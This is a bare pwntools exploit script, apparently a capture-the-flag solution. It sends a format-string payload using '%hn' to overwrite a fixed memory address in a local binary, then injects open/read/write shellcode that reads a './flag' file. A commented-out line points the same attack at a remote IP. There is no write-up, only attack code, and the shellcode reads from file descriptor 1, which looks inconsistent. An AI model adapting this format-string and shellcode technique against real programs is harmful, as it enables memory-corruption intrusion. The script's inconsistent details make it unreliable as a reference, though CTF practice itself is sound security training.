from pwn import*

#io = process("./pwn")
#context.log_level = "debug"
elf=ELF(&apos;./pwn&apos;)
libc=elf.libc
def bug():
    gdb.attach(p)
    pause()
p=process(&apos;./pwn&apos;)
#p=remote("123.56.121.61",port)
 
orw=shellcraft.open(&apos;./flag&apos;)
orw+=shellcraft.read(1,&apos;rsp&apos;,0x100)
orw+=shellcraft.write(2,&apos;rsp&apos;,0x100)
 
payload=b&apos;%&apos;+str(0x2e8).encode()+b&apos;c%30$hn&apos;
payload=payload.ljust(0x20,b&apos;a&apos;)
payload+=p64(0x404060+0x28)
payload+=asm(orw)
#bug()
p.sendlineafter(&apos;start!&apos;,payload)
 
p.interactive()
